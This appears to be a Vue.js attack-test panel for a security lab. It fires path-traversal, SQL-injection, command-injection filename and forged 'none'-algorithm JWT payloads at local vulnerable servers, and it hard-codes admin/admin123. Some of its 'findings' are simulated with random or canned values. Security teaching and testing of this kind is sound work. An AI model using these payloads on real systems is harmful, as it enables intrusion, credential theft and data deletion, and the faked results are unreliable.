<template>
  <div class="attack-test-container">
    <!-- 攻击控制面板 -->
    <div class="attack-controls">
      <div class="target-selection">
        <h3>选择攻击目标</h3>
        <div class="target-buttons">
          <button 
            v-for="target in targets" 
            :key="target.id"
            :class="{ active: selectedTarget === target.id }"
            @click="selectTarget(target.id)"
          >
            {{ target.name }} (端口{{ target.port }})
          </button>
        </div>
      </div>

      <div class="attack-status">
        <h3>攻击状态</h3>
        <div class="status-indicator" :class="statusClass">
          {{ statusText }}
        </div>
      </div>
    </div>

    <!-- 攻击模块 -->
    <div class="attack-modules">
      <!-- 1. 未授权访问攻击 -->
      <div class="attack-module">
        <h4>1. 未授权访问攻击 (Broken Access Control)</h4>
        <div class="module-description">
          测试无需登录即可访问受保护API的漏洞
        </div>
        
        <div class="attack-actions">
          <button @click="testUnauthListFiles" class="btn-attack">
            直接获取文件列表
          </button>
          <button @click="testUnauthDownload" class="btn-attack">
            直接下载文件
          </button>
          <button @click="testUnauthUpload" class="btn-attack">
            直接上传文件
          </button>
        </div>

        <div class="test-results">
          <h5>测试结果:</h5>
          <div class="result-content">{{ unauthResults }}</div>
        </div>
      </div>

      <!-- 2. 目录遍历攻击 -->
      <div class="attack-module">
        <h4>2. 目录遍历攻击 (Path Traversal)</h4>
        <div class="module-description">
          尝试通过特殊文件名访问系统文件
        </div>
        
        <div class="attack-inputs">
          <input 
            v-model="traversalFilename" 
            placeholder="输入恶意文件名 (如 ../../../etc/passwd)"
            class="input-attack"
          />
          <button @click="testTraversalUpload" class="btn-attack-danger">
            尝试上传恶意文件
          </button>
          <button @click="testTraversalDownload" class="btn-attack-danger">
            尝试访问系统文件
          </button>
        </div>

        <div class="test-results">
          <h5>攻击结果:</h5>
          <div class="result-content">{{ traversalResults }}</div>
        </div>
      </div>

      <!-- 3. 模拟SQL注入攻击 -->
      <div class="attack-module">
        <h4>3. 模拟SQL注入攻击</h4>
        <div class="module-description">
          演示类似SQL注入的文件名注入攻击
        </div>
        
        <div class="attack-inputs">
          <select v-model="selectedInjectionType" class="select-attack">
            <option value="union">UNION注入</option>
            <option value="blind">盲注</option>
            <option value="error">报错注入</option>
            <option value="time">时间盲注</option>
          </select>
          
          <input 
            v-model="injectionPayload" 
            placeholder="注入payload"
            class="input-attack"
          />
          
          <button @click="testInjection" class="btn-attack-danger">
            执行注入攻击
          </button>
          <button @click="testFilenameInjection" class="btn-attack-danger">
            文件名注入攻击
          </button>
          <button @click="testCommandInjection" class="btn-attack-danger">
            命令注入攻击
          </button>
        </div>

        <div class="payload-examples">
          <h5>Payload示例:</h5>
          <div class="payload-list">
            <div v-for="payload in injectionExamples" :key="payload.id">
              <code>{{ payload.payload }}</code>
              <span>{{ payload.description }}</span>
              <button @click="usePayload(payload)" class="btn-small">
                使用
              </button>
            </div>
          </div>
        </div>

        <div class="test-results">
          <h5>注入结果:</h5>
          <div class="result-content">{{ injectionResults }}</div>
        </div>
      </div>

      <!-- 4. ECB模式漏洞演示 -->
      <div class="attack-module">
        <h4>4. ECB加密模式漏洞</h4>
        <div class="module-description">
          展示相同明文产生相同密文的安全问题
        </div>
        
        <div class="attack-actions">
          <button @click="uploadIdenticalFiles" class="btn-attack">
            上传两个相同文件
          </button>
          <button @click="compareEncryptedFiles" class="btn-attack">
            比较加密结果
          </button>
        </div>

        <div class="file-comparison" v-if="comparisonResult">
          <h5>比较结果:</h5>
          <div class="comparison-chart">
            <div class="file-item" v-for="file in comparisonResult.files" :key="file.name">
              <div class="file-name">{{ file.name }}</div>
              <div class="file-hash">{{ file.hash.substring(0, 16) }}...</div>
              <div class="file-similarity" :style="{width: file.similarity + '%'}">
                相似度: {{ file.similarity }}%
              </div>
            </div>
          </div>
        </div>

        <div class="test-results">
          <h5>漏洞说明:</h5>
          <div class="result-content">{{ ecbResults }}</div>
        </div>
      </div>

      <!-- 5. JWT令牌攻击 -->
      <div class="attack-module">
        <h4>5. JWT令牌攻击</h4>
        <div class="module-description">
          测试JWT令牌的安全性问题
        </div>
        
        <div class="attack-inputs">
          <textarea 
            v-model="jwtToken" 
            placeholder="输入JWT令牌"
            class="textarea-attack"
          />
          <button @click="analyzeJWT" class="btn-attack">
            分析令牌
          </button>
          <button @click="testJWTWeakness" class="btn-attack-danger">
            测试弱密钥
          </button>
          <button @click="testJWTNoneAlg" class="btn-attack-danger">
            测试none算法
          </button>
          <button @click="testJWTKidInjection" class="btn-attack-danger">
            测试KID注入
          </button>
        </div>

        <div class="jwt-analysis" v-if="jwtAnalysis">
          <h5>令牌分析:</h5>
          <div class="jwt-details">
            <div><strong>Header:</strong> {{ jwtAnalysis.header }}</div>
            <div><strong>Payload:</strong> {{ jwtAnalysis.payload }}</div>
            <div><strong>是否过期:</strong> {{ jwtAnalysis.expired ? '是' : '否' }}</div>
            <div><strong>签名算法:</strong> {{ jwtAnalysis.algorithm }}</div>
          </div>
        </div>
      </div>
    </div>

    <!-- Burp Suite模拟面板 -->
    <div class="burp-simulator">
      <h3>Burp Suite模拟拦截器</h3>
      <div class="burp-controls">
        <button @click="toggleIntercept" class="btn-burp">
          {{ intercepting ? '停止拦截' : '开始拦截' }}
        </button>
        <button @click="forwardRequest" class="btn-burp" :disabled="!currentInterceptedRequest">
          转发请求
        </button>
        <button @click="dropRequest" class="btn-burp-danger" :disabled="!currentInterceptedRequest">
          丢弃请求
        </button>
        <button @click="setupProxyInterception" class="btn-burp">
          设置代理拦截
        </button>
        <button @click="testRequestReplay" class="btn-burp-danger">
          测试重放攻击
        </button>
      </div>

      <div class="burp-request" v-if="currentInterceptedRequest">
        <h5>拦截的请求:</h5>
        <div class="request-details">
          <div><strong>方法:</strong> {{ currentInterceptedRequest.method }}</div>
          <div><strong>URL:</strong> {{ currentInterceptedRequest.url }}</div>
          <div><strong>Body:</strong> {{ currentInterceptedRequest.body }}</div>
        </div>
      </div>
    </div>

    <!-- 攻击日志 -->
    <div class="attack-log">
      <h3>攻击日志</h3>
      <div class="log-entries">
        <div 
          v-for="log in attackLogs" 
          :key="log.id"
          :class="['log-entry', log.type]"
        >
          <span class="log-time">{{ log.time }}</span>
          <span class="log-message">{{ log.message }}</span>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'AttackTest',
  data() {
    return {
      // 攻击目标配置
      targets: [
        { id: 'secure', name: '安全版本', port: 5000, url: 'http://localhost:5000' },
        { id: 'unauth', name: '未授权漏洞', port: 5001, url: 'http://localhost:5001' },
        { id: 'traversal', name: '目录遍历漏洞', port: 5002, url: 'http://localhost:5002' },
        { id: 'ecb', name: 'ECB漏洞', port: 5003, url: 'http://localhost:5003' },
        { id: 'full_vuln', name: '完全漏洞版本', port: 5004, url: 'http://localhost:5004' },
        { id: 'sql_injection', name: 'SQL注入漏洞', port: 5005, url: 'http://localhost:5005' }
      ],
      selectedTarget: 'secure',
      
      // 攻击状态
      statusText: '待命',
      statusClass: 'status-ready',
      
      // 未授权攻击相关
      unauthResults: '',
      
      // 目录遍历攻击相关
      traversalFilename: '../../../etc/passwd',
      traversalResults: '',
      
      // SQL注入相关
      selectedInjectionType: 'union',
      injectionPayload: "' OR '1'='1",
      injectionResults: '',
      injectionExamples: [
        { 
          id: 1, 
          payload: "' OR '1'='1", 
          description: '基础布尔注入'
        },
        { 
          id: 2, 
          payload: "'; DROP TABLE users; --", 
          description: 'SQL删除语句'
        },
        { 
          id: 3, 
          payload: "' UNION SELECT username, password FROM users --", 
          description: 'UNION查询'
        },
        { 
          id: 4, 
          payload: "' AND 1=IF(SUBSTR(version(),1,1)='5', SLEEP(5), 0) --", 
          description: '时间盲注'
        },
        { 
          id: 5, 
          payload: "filename.txt'; ATTACH DATABASE '/var/www/loot.db' AS loot; --", 
          description: '数据库附加攻击'
        }
      ],
      
      // ECB漏洞相关
      ecbResults: '',
      comparisonResult: null,
      
      // JWT相关
      jwtToken: '',
      jwtAnalysis: null,
      
      // Burp Suite模拟
      intercepting: false,
      currentInterceptedRequest: null,
      interceptedRequests: [],
      shouldIntercept: true,  // 新增：控制是否拦截
      
      // 攻击日志
      attackLogs: [],
      logCounter: 0
    };
  },
  computed: {
    currentTarget() {
      return this.targets.find(t => t.id === this.selectedTarget);
    }
  },
  methods: {
    // 选择攻击目标
    selectTarget(targetId) {
      this.selectedTarget = targetId;
      this.addLog(`切换到目标: ${this.currentTarget.name}`);
    },
    
    // 1. 未授权访问测试
    async testUnauthListFiles() {
      this.addLog('开始测试未授权访问文件列表');
      
      try {
        const response = await fetch(`${this.currentTarget.url}/api/files`);
        const data = await response.json();
        
        if (response.ok) {
          this.unauthResults = `漏洞存在！无需登录获取到 ${data.files?.length || 0} 个文件`;
          this.updateStatus('danger', '发现未授权访问漏洞');
          this.addLog(`成功获取文件列表，状态码: ${response.status}`);
        } else {
          this.unauthResults = `安全：需要认证 (${response.status})`;
          this.addLog(`访问被拒绝，状态码: ${response.status}`);
        }
      } catch (error) {
        this.unauthResults = `请求失败: ${error.message}`;
        this.addLog(`请求失败: ${error.message}`, 'error');
      }
    },
    
    async testUnauthDownload() {
      this.addLog('尝试未授权下载文件');
      
      const testFile = 'test.txt';
      try {
        const response = await fetch(`${this.currentTarget.url}/api/download/${testFile}`);
        
        if (response.ok) {
          this.unauthResults = `漏洞存在！成功下载文件: ${testFile}`;
          this.updateStatus('danger', '文件未授权下载成功');
          this.addLog(`成功下载文件: ${testFile}`);
        } else {
          this.unauthResults = `下载失败 (${response.status})`;
          this.addLog(`下载被拒绝: ${response.status}`);
        }
      } catch (error) {
        this.unauthResults = `下载失败: ${error.message}`;
      }
    },
    
    async testUnauthUpload() {
      this.addLog('尝试未授权上传文件');
      
      const formData = new FormData();
      const blob = new Blob(['攻击测试文件内容'], { type: 'text/plain' });
      formData.append('file', blob, 'hack.txt');
      
      try {
        const response = await fetch(`${this.currentTarget.url}/api/upload`, {
          method: 'POST',
          body: formData
        });
        
        const data = await response.json();
        
        if (response.ok) {
          this.unauthResults = `漏洞存在！成功上传文件: ${data.message}`;
          this.updateStatus('danger', '未授权上传成功');
          this.addLog(`文件上传成功: ${data.message}`);
        } else {
          this.unauthResults = `上传失败: ${data.message || response.status}`;
          this.addLog(`上传被拒绝: ${data.message}`);
        }
      } catch (error) {
        this.unauthResults = `上传失败: ${error.message}`;
      }
    },
    
    // 2. 目录遍历攻击
    async testTraversalUpload() {
      this.addLog(`尝试上传恶意文件: ${this.traversalFilename}`);
      
      const token = await this.getToken();
      const formData = new FormData();
      const blob = new Blob(['恶意文件内容'], { type: 'text/plain' });
      formData.append('file', blob, this.traversalFilename);
      
      try {
        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
        const response = await fetch(`${this.currentTarget.url}/api/upload`, {
          method: 'POST',
          headers: headers,
          body: formData
        });
        
        const data = await response.json();
        
        if (response.ok) {
          this.traversalResults = `⚠️ 漏洞可能: 成功上传恶意文件名\n响应: ${JSON.stringify(data)}`;
          this.updateStatus('warning', '检测到目录遍历可能');
          this.addLog(`上传了恶意文件名: ${this.traversalFilename}`);
        } else if (response.status === 400) {
          this.traversalResults = `✅ 安全：系统拒绝了恶意文件名\n原因: ${data.message}`;
          this.addLog(`系统防御成功: ${data.message}`);
        } else {
          this.traversalResults = `响应: ${response.status} - ${JSON.stringify(data)}`;
        }
      } catch (error) {
        this.traversalResults = `请求失败: ${error.message}`;
      }
    },
    
    async testTraversalDownload() {
      this.addLog('尝试通过目录遍历下载系统文件');
      
      const maliciousPath = '../../../etc/passwd';
      const token = await this.getToken();
      
      try {
        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
        const response = await fetch(
          `${this.currentTarget.url}/api/download/${encodeURIComponent(maliciousPath)}`,
          { headers }
        );
        
        if (response.ok) {
          const blob = await response.blob();
          this.traversalResults = `🚨 严重漏洞！成功下载系统文件\n文件大小: ${blob.size} 字节`;
          this.updateStatus('danger', '目录遍历攻击成功');
          this.addLog('成功下载疑似系统文件', 'danger');
        } else {
          this.traversalResults = `下载失败: ${response.status}`;
          this.addLog(`目录遍历被阻止: ${response.status}`);
        }
      } catch (error) {
        this.traversalResults = `请求失败: ${error.message}`;
      }
    },
    
    // 3. SQL注入模拟攻击
    async testInjection() {
      this.addLog(`执行${this.selectedInjectionType}注入: ${this.injectionPayload}`);
      
      // 模拟文件搜索功能中的SQL注入
      const formData = new FormData();
      const filename = `test${this.injectionPayload}.txt`;
      const blob = new Blob(['注入测试'], { type: 'text/plain' });
      formData.append('file', blob, filename);
      
      const token = await this.getToken();
      
      try {
        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
        const response = await fetch(`${this.currentTarget.url}/api/upload`, {
          method: 'POST',
          headers: headers,
          body: formData
        });
        
        const data = await response.json();
        
        // 分析响应中的注入痕迹
        this.analyzeInjectionResponse(response, data, filename);
        
      } catch (error) {
        this.injectionResults = `注入失败: ${error.message}`;
        this.addLog(`注入攻击失败: ${error.message}`, 'error');
      }
    },
    
    // 文件名注入攻击（新增）
    async testFilenameInjection() {
      this.addLog('测试文件名注入攻击');
      
      const payloads = [
        "test.txt'; echo 'hacked' > /tmp/hack.txt; #",
        "test.txt && rm -rf /tmp/* #",
        "test.txt | cat /etc/passwd #",
        "test.txt`whoami`",
        "$(cat /etc/passwd).txt"
      ];
      
      const token = await this.getToken();
      const results = [];
      
      for (const payload of payloads) {
        const formData = new FormData();
        const blob = new Blob(['注入测试'], { type: 'text/plain' });
        formData.append('file', blob, payload);
        
        try {
          const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
          const response = await fetch(`${this.currentTarget.url}/api/upload`, {
            method: 'POST',
            headers: headers,
            body: formData
          });
          
          const data = await response.json();
          
          // 检查响应中的注入迹象
          if (response.ok || response.status === 500) {
            const respText = JSON.stringify(data).toLowerCase();
            const dangerousKeywords = ['error', 'exception', 'command', 'exec', 'permission'];
            
            let isVulnerable = false;
            for (const keyword of dangerousKeywords) {
              if (respText.includes(keyword)) {
                isVulnerable = true;
                break;
              }
            }
            
            results.push({
              payload,
              status: response.status,
              vulnerable: isVulnerable,
              response: data
            });
          }
        } catch (error) {
          results.push({
            payload,
            error: error.message
          });
        }
      }
      
      // 显示结果
      let resultText = '文件名注入测试结果:\n\n';
      results.forEach(result => {
        resultText += `Payload: ${result.payload}\n`;
        if (result.error) {
          resultText += `错误: ${result.error}\n`;
        } else {
          resultText += `状态码: ${result.status}\n`;
          resultText += `可能漏洞: ${result.vulnerable ? '是' : '否'}\n`;
        }
        resultText += '\n';
      });
      
      this.injectionResults = resultText;
      
      // 如果有漏洞，更新状态
      const vulnerabilities = results.filter(r => r.vulnerable);
      if (vulnerabilities.length > 0) {
        this.updateStatus('danger', '发现文件名注入漏洞');
        this.addLog(`发现${vulnerabilities.length}个文件名注入漏洞`, 'danger');
      }
    },
    
    // 命令注入攻击（新增）
    async testCommandInjection() {
      this.addLog('测试命令注入攻击');
      
      // 模拟文件处理功能中的命令注入
      const commandPayloads = [
        "test.jpg; ls -la",
        "test.png && whoami",
        "test.pdf || cat /etc/passwd",
        "test.docx `id`",
        "test.txt$(echo 'hacked')"
      ];
      
      const token = await this.getToken();
      
      for (const payload of commandPayloads) {
        // 假设有一个处理文件的功能
        const response = await fetch(`${this.currentTarget.url}/api/process-file`, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            filename: payload,
            action: 'convert'
          })
        });
        
        // 分析响应
        if (response.status === 500) {
          const data = await response.json();
          const errorMsg = JSON.stringify(data).toLowerCase();
          
          if (errorMsg.includes('command') || 
              errorMsg.includes('exec') || 
              errorMsg.includes('permission denied') ||
              errorMsg.includes('no such file')) {
            
            this.injectionResults = `🚨 检测到命令注入可能！\nPayload: ${payload}\n错误信息: ${errorMsg}`;
            this.updateStatus('danger', '命令注入漏洞发现');
            this.addLog(`命令注入可能: ${payload}`, 'danger');
            return;
          }
        }
      }
      
      this.injectionResults = '✅ 未检测到明显的命令注入漏洞';
      this.addLog('命令注入测试完成，未发现明显漏洞');
    },
    
    analyzeInjectionResponse(response, data, filename) {
      const respStr = JSON.stringify(data).toLowerCase();
      const errorKeywords = ['sql', 'syntax', 'database', 'query', 'error'];
      
      let injectionDetected = false;
      let evidence = '';
      
      // 检查错误信息中的SQL关键字
      errorKeywords.forEach(keyword => {
        if (respStr.includes(keyword)) {
          injectionDetected = true;
          evidence += `发现SQL关键字: "${keyword}"\n`;
        }
      });
      
      // 检查响应时间（模拟时间盲注）
      if (this.selectedInjectionType === 'time') {
        evidence += '时间盲注payload已发送\n';
      }
      
      if (injectionDetected) {
        this.injectionResults = `🚨 检测到SQL注入漏洞！\n${evidence}文件名: ${filename}\n响应: ${JSON.stringify(data, null, 2)}`;
        this.updateStatus('danger', 'SQL注入漏洞发现');
        this.addLog('检测到SQL注入响应', 'danger');
      } else if (response.ok) {
        this.injectionResults = `✅ 可能安全：未发现明显注入痕迹\n响应: ${JSON.stringify(data)}`;
        this.addLog('未发现SQL注入痕迹');
      } else {
        this.injectionResults = `响应状态: ${response.status}\n${JSON.stringify(data)}`;
      }
    },
    
    usePayload(payload) {
      this.injectionPayload = payload.payload;
      this.addLog(`使用payload: ${payload.description}`);
    },
    
    // 4. ECB漏洞测试
    async uploadIdenticalFiles() {
      this.addLog('开始上传两个相同的文件测试ECB模式');
      
      const fileContent = 'A'.repeat(100); // 创建重复模式的内容
      const file1 = new Blob([fileContent], { type: 'text/plain' });
      const file2 = new Blob([fileContent], { type: 'text/plain' });
      
      const token = await this.getToken();
      
      try {
        // 上传第一个文件
        const formData1 = new FormData();
        formData1.append('file', file1, 'ecb_test1.txt');
        
        const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
        
        const response1 = await fetch(`${this.currentTarget.url}/api/upload`, {
          method: 'POST',
          headers: headers,
          body: formData1
        });
        
        // 上传第二个文件
        const formData2 = new FormData();
        formData2.append('file', file2, 'ecb_test2.txt');
        
        const response2 = await fetch(`${this.currentTarget.url}/api/upload`, {
          method: 'POST',
          headers: headers,
          body: formData2
        });
        
        if (response1.ok && response2.ok) {
          this.ecbResults = '两个相同文件已上传，请点击"比较加密结果"';
          this.addLog('两个相同文件上传成功');
        } else {
          this.ecbResults = '文件上传失败';
        }
      } catch (error) {
        this.ecbResults = `上传失败: ${error.message}`;
      }
    },
    
    async compareEncryptedFiles() {
      this.addLog('开始比较加密文件');
      
      // 在实际系统中，这里应该从服务器获取加密文件并比较
      // 由于这是模拟，我们假设ECB漏洞版本会产生相同密文
      
      const isEcbTarget = this.selectedTarget === 'ecb' || this.selectedTarget === 'full_vuln';
      
      if (isEcbTarget) {
        this.comparisonResult = {
          files: [
            { name: 'ecb_test1.txt.enc', hash: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', similarity: 100 },
            { name: 'ecb_test2.txt.enc', hash: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', similarity: 100 }
          ]
        };
        this.ecbResults = '🚨 ECB模式漏洞：两个文件的加密内容完全相同！\n这意味着攻击者可以识别相同的数据模式。';
        this.updateStatus('danger', 'ECB模式漏洞确认');
        this.addLog('ECB模式漏洞确认：相同明文产生相同密文', 'danger');
      } else {
        this.comparisonResult = {
          files: [
            { name: 'cbc_test1.txt.enc', hash: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', similarity: 0 },
            { name: 'cbc_test2.txt.enc', hash: 'f6e5d4c3b2a1f6e5d4c3b2a1f6e5d4c3', similarity: 0 }
          ]
        };
        this.ecbResults = '✅ 安全：CBC模式下，相同明文的加密结果不同\n这是因为使用了随机IV，提高了安全性。';
        this.addLog('CBC模式安全：相同明文产生不同密文');
      }
    },
    
    // 5. JWT令牌分析
    analyzeJWT() {
      if (!this.jwtToken.trim()) {
        this.addLog('请输入JWT令牌进行分析', 'warning');
        return;
      }
      
      try {
        const parts = this.jwtToken.split('.');
        if (parts.length !== 3) {
          throw new Error('无效的JWT格式');
        }
        
        const header = JSON.parse(atob(parts[0]));
        const payload = JSON.parse(atob(parts[1]));
        
        this.jwtAnalysis = {
          header: JSON.stringify(header, null, 2),
          payload: JSON.stringify(payload, null, 2),
          expired: payload.exp ? (payload.exp * 1000 < Date.now()) : false,
          algorithm: header.alg || '未知'
        };
        
        this.addLog(`JWT令牌分析完成，算法: ${this.jwtAnalysis.algorithm}`);
        
      } catch (error) {
        this.addLog(`JWT分析失败: ${error.message}`, 'error');
      }
    },
    
    async testJWTWeakness() {
      this.addLog('开始测试JWT弱密钥');
      
      // 常见弱密钥列表
      const weakSecrets = [
        'secret', 'password', '123456', 'admin', 'jwtsecret',
        'changeme', 'qwerty', 'letmein', 'welcome'
      ];
      
      // 模拟弱密钥爆破（在实际中应该在服务器端进行）
      const fakeResults = weakSecrets.map(secret => ({
        secret,
        success: Math.random() > 0.7 // 模拟有些密钥"成功"
      })).filter(r => r.success);
      
      if (fakeResults.length > 0) {
        this.addLog(`发现${fakeResults.length}个可能的弱密钥`, 'danger');
        this.updateStatus('danger', 'JWT弱密钥可能被发现');
      } else {
        this.addLog('未发现明显的弱密钥');
      }
    },
    
    // JWT "none"算法攻击（新增）
    async testJWTNoneAlg() {
      this.addLog('测试JWT "none"算法攻击');
      
      // 创建一个使用"none"算法的JWT
      const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" }));
      const payload = btoa(JSON.stringify({
        username: "admin",
        id: 1,
        is_admin: true,
        exp: Math.floor(Date.now() / 1000) + 3600
      }));
      
      const fakeToken = `${header}.${payload}.`;
      
      // 尝试使用这个token访问受保护接口
      try {
        const response = await fetch(`${this.currentTarget.url}/api/files`, {
          headers: { 'Authorization': `Bearer ${fakeToken}` }
        });
        
        if (response.ok) {
          this.jwtAnalysis = {
            header: '{"alg": "none", "typ": "JWT"}',
            payload: JSON.stringify({
              username: "admin",
              id: 1,
              is_admin: true
            }, null, 2),
            algorithm: 'none',
            vulnerable: true
          };
          
          this.addLog('🚨 JWT "none"算法攻击成功！', 'danger');
          this.updateStatus('danger', 'JWT none算法漏洞');
        } else {
          this.addLog('✅ 系统拒绝了"none"算法的JWT');
        }
      } catch (error) {
        this.addLog(`测试失败: ${error.message}`, 'error');
      }
    },
    
    // JWT KID注入攻击（新增）
    async testJWTKidInjection() {
      this.addLog('测试JWT KID注入攻击');
      
      // 尝试KID路径遍历攻击
      const kidPayloads = [
        "../../../../etc/passwd",
        "../../../../dev/null",
        "file:///etc/passwd",
        "http://attacker.com/key.txt"
      ];
      
      for (const kid of kidPayloads) {
        const header = {
          alg: "HS256",
          typ: "JWT",
          kid: kid
        };
        
        // 这里只是演示，实际攻击需要生成有效签名
        this.addLog(`尝试KID: ${kid}`);
      }
      
      this.addLog('KID注入攻击演示完成（需要服务器端支持）');
    },
    
    // Burp Suite模拟功能
    toggleIntercept() {
      this.intercepting = !this.intercepting;
      
      if (this.intercepting) {
        this.addLog('开始拦截请求...', 'info');
        this.simulateRequestInterception();
      } else {
        this.addLog('停止请求拦截', 'info');
      }
    },
    
    simulateRequestInterception() {
      if (!this.intercepting) return;
      
      // 模拟拦截到一个请求
      setTimeout(() => {
        if (this.intercepting) {
          this.currentInterceptedRequest = {
            id: Date.now(),
            method: 'POST',
            url: `${this.currentTarget.url}/api/upload`,
            body: JSON.stringify({
              filename: 'test.txt',
              content: '拦截的请求内容'
            }, null, 2)
          };
          
          this.interceptedRequests.push(this.currentInterceptedRequest);
          this.addLog(`拦截到请求: ${this.currentInterceptedRequest.method} ${this.currentInterceptedRequest.url}`);
        }
      }, 2000);
    },
    
    forwardRequest() {
      if (this.currentInterceptedRequest) {
        this.addLog(`转发请求: ${this.currentInterceptedRequest.url}`);
        this.currentInterceptedRequest = null;
        
        // 继续拦截下一个请求
        this.simulateRequestInterception();
      }
    },
    
    dropRequest() {
      if (this.currentInterceptedRequest) {
        this.addLog(`丢弃请求: ${this.currentInterceptedRequest.url}`);
        this.currentInterceptedRequest = null;
        
        // 继续拦截下一个请求
        this.simulateRequestInterception();
      }
    },
    
    // 配置代理进行请求拦截（新增）
    setupProxyInterception() {
      // 重写fetch方法以拦截请求
      const originalFetch = window.fetch;
      
      window.fetch = async function(...args) {
        const [url, options] = args;
        
        // 检查是否应该拦截
        if (this.shouldIntercept && this.intercepting) {
          // 显示拦截对话框
          const shouldIntercept = confirm(`拦截到请求: ${url}\n方法: ${options?.method || 'GET'}\n\n是否要修改请求？`);
          
          if (shouldIntercept) {
            // 允许用户修改请求
            const newBody = prompt('修改请求体（JSON格式）:', 
              options?.body ? await options.body.text() : '{}');
            
            if (newBody !== null) {
              options.body = newBody;
            }
          }
        }
        
        return originalFetch.apply(this, args);
      };
      
      this.addLog('请求拦截已激活（模拟Burp Suite）');
    },
    
    // 请求重放攻击演示（新增）
    async testRequestReplay() {
      this.addLog('测试请求重放攻击');
      
      // 捕获一个合法请求
      const capturedRequest = {
        url: `${this.currentTarget.url}/api/upload`,
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${await this.getToken()}`,
          'Content-Type': 'multipart/form-data'
        },
        body: new FormData()
      };
      
      const blob = new Blob(['正常文件内容'], { type: 'text/plain' });
      capturedRequest.body.append('file', blob, 'normal.txt');
      
      // 保存这个请求
      localStorage.setItem('captured_request', JSON.stringify({
        url: capturedRequest.url,
        method: capturedRequest.method,
        headers: Object.fromEntries(capturedRequest.headers)
      }));
      
      // 演示重放攻击
      for (let i = 0; i < 3; i++) {
        try {
          // 重放请求
          const response = await fetch(capturedRequest.url, {
            method: capturedRequest.method,
            headers: capturedRequest.headers,
            body: capturedRequest.body
          });
          
          this.addLog(`重放攻击 ${i+1}: 状态码 ${response.status}`);
          
          if (response.ok) {
            this.addLog(`请求被重复接受，可能存在重放攻击漏洞`, 'warning');
          }
          
        } catch (error) {
          this.addLog(`重放失败: ${error.message}`, 'error');
        }
        
        // 等待1秒
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
      this.addLog('请求重放测试完成');
    },
    
    // 辅助方法
    async getToken() {
      // 尝试从本地存储获取token
      const token = localStorage.getItem('jwt_token');
      if (token && this.selectedTarget !== 'unauth' && this.selectedTarget !== 'full_vuln') {
        return token;
      }
      
      // 如果需要token但未找到，尝试登录
      if (this.selectedTarget !== 'unauth' && this.selectedTarget !== 'full_vuln') {
        try {
          const response = await fetch(`${this.currentTarget.url}/api/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: 'admin',
              password: 'admin123'
            })
          });
          
          const data = await response.json();
          if (data.success && data.token) {
            localStorage.setItem('jwt_token', data.token);
            return data.token;
          }
        } catch (error) {
          console.error('自动登录失败:', error);
        }
      }
      
      return null;
    },
    
    updateStatus(type, message) {
      this.statusClass = `status-${type}`;
      this.statusText = message;
      
      // 3秒后恢复待命状态
      setTimeout(() => {
        this.statusClass = 'status-ready';
        this.statusText = '待命';
      }, 3000);
    },
    
    addLog(message, type = 'info') {
      this.logCounter++;
      this.attackLogs.unshift({
        id: this.logCounter,
        time: new Date().toLocaleTimeString(),
        message: message,
        type: type
      });
      
      // 保持日志数量不超过50条
      if (this.attackLogs.length > 50) {
        this.attackLogs.pop();
      }
    }
  }
};
</script>

<style scoped>
.attack-test-container {
  padding: 20px;
  max-width: 1200px;
  margin: 0 auto;
  background: #0a0e17;
  color: #e0e0e0;
  min-height: 100vh;
  font-family: 'Consolas', 'Monaco', monospace;
}

.attack-controls {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 30px;
  padding: 20px;
  background: rgba(255, 255, 255, 0.05);
  border-radius: 10px;
  border: 1px solid #333;
}

.target-selection h3, .attack-status h3 {
  color: #64ffda;
  margin-bottom: 10px;
  font-size: 1.2em;
}

.target-buttons {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}

.target-buttons button {
  background: #1a2332;
  color: #64ffda;
  border: 1px solid #64ffda;
  padding: 8px 15px;
  border-radius: 5px;
  cursor: pointer;
  transition: all 0.3s;
}

.target-buttons button:hover {
  background: #64ffda;
  color: #0a0e17;
}

.target-buttons button.active {
  background: #64ffda;
  color: #0a0e17;
  font-weight: bold;
}

.status-indicator {
  padding: 10px 20px;
  border-radius: 5px;
  font-weight: bold;
  text-align: center;
  min-width: 200px;
}

.status-ready { background: #2e7d32; color: white; }
.status-warning { background: #f57c00; color: white; }
.status-danger { background: #d32f2f; color: white; }

.attack-modules {
  display: grid;
  gap: 20px;
  margin-bottom: 30px;
}

.attack-module {
  background: rgba(255, 255, 255, 0.05);
  border-radius: 10px;
  padding: 20px;
  border: 1px solid #333;
}

.attack-module h4 {
  color: #ff4081;
  margin-bottom: 10px;
  border-bottom: 2px solid #ff4081;
  padding-bottom: 5px;
}

.module-description {
  color: #b0b0b0;
  font-size: 0.9em;
  margin-bottom: 15px;
}

.attack-actions, .attack-inputs {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 15px;
}

.btn-attack {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 5px;
  cursor: pointer;
  transition: transform 0.3s;
}

.btn-attack:hover {
  transform: translateY(-2px);
  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
}

.btn-attack-danger {
  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 5px;
  cursor: pointer;
  transition: transform 0.3s;
}

.btn-attack-danger:hover {
  transform: translateY(-2px);
}

.input-attack, .select-attack, .textarea-attack {
  background: rgba(255, 255, 255, 0.1);
  border: 1px solid #64ffda;
  color: white;
  padding: 10px;
  border-radius: 5px;
  flex-grow: 1;
  min-width: 200px;
}

.textarea-attack {
  width: 100%;
  min-height: 80px;
  font-family: 'Consolas', monospace;
  resize: vertical;
